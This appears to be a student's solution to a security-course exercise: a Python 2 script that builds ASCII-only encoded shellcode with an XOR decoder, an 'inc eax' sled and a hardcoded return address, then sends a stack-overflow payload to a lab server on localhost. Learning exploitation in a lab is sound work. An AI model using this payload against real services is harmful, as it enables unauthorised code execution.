#!/usr/bin/python

import os, socket,assemble,struct
import q2


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def get_raw_shellcode():
    return q2.get_shellcode()


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    #xors contains the assembly commands of the decoder
    xors=[]


    binary_shell = get_raw_shellcode()


    xors.append("push esp")
    xors.append("pop eax")
    
    offset_from_esp = 4+30+len(binary_shell)

    #in oreder to put the shellcode (without) the decoder address in eax, we do it relativly to esp
    #The shellcode end exaclty 30 bytes from the location of the return address, which is 4 away from the esp 

    for desp in range(1,offset_from_esp-127+1):
        xors.append("dec eax")

    #to reach eax= esp-|shellcode| -30 -4, eax needs to be decremented manually
    #edx = eax +127, and used to fix distant bytes
    xors.append("push eax")
    xors.append("pop edx")

    for i in range(1,128):
        xors.append("dec eax")

    #0 assigned to ebx, then ebx decremented and then contains 0xffffffff

    xors.append("push 0")
    xors.append("pop ebx")

    xors.append("dec ebx")


    #to correct contains the indexed of the bytes that needs to be xored with ff, in the second for loop xor command is made
    #individually for every byte that needs to be fixed
    #the first for loop xors the bytes in the shellcode binary and stores the ascii legit binary in lassembly

    lassembly = list(binary_shell)
    toCorrect = []
    place =0 
    for c in range(0,len(lassembly)):
        n = ord( lassembly[c] )
        if n >= 0x80:
            toCorrect.append(c)
            lassembly[c] = chr (ord(lassembly[c]) ^ 0xff)
        

    for j in toCorrect:
        if j > 127:
            back = j -127
            xors.append( "XOR byte ptr [EDX+"+str(back)+"],BL")
        else:
            xors.append( "XOR byte ptr [EAX+"+str(j)+"],BL")
    

    binarryDecode =""
    for command in xors:
        binarryDecode = binarryDecode+ assemble.assemble_data(command)


    finalShell =  binarryDecode+ "".join(lassembly)
    

    return finalShell
    

    # NOTES:
    # 1. Don't delete this function - we are going to test it directly.
    # 2. You should use the shellcode you implemented in the previous question,
    #    by calling `get_raw_shellcode()`


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    shellcode = get_shellcode()
    intAdd = int("bfffe12c",16)
    

    # 0xbfffe12c is "return address"s address on the stack, the end of the code will be -30 bytes below it - it is done to make sure 
    #that when we use the stack memory (e.x "mov     [ebp-0x0C], eax") we wont override our shellcode
    #the begining of the shellcode can be calculated relativly to the address of the "return address", I also decreased by 30 more to reach nop slide
    #that begins before the code rather then the begining of the shellcode itself
    intAdd = intAdd - len(shellcode) - 30 - 30
    
    StrAdd =str(hex(intAdd))



    StrAdd = StrAdd[2:len(StrAdd)-1]

    #big contains the buffer starting address, 
  
    big = StrAdd.decode("hex")
    #the system expects binary in little-endian convention, so we need to flip the address
    

    little = big[::-1]

    #chr(64) equal to 0x40 which translates to the 'inc eax' command that i use instead of nop's
    toInsert = chr(64) * 1040 
   
    toInsert = toInsert[:len(toInsert)-len(shellcode) -30]
    #the 30 bytes of chr(0) will be used for varibales of the shellcode
    toInsert = toInsert + shellcode +chr(0)*30+ little 
               
    return  struct.pack('>L', len(toInsert)) + toInsert


    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
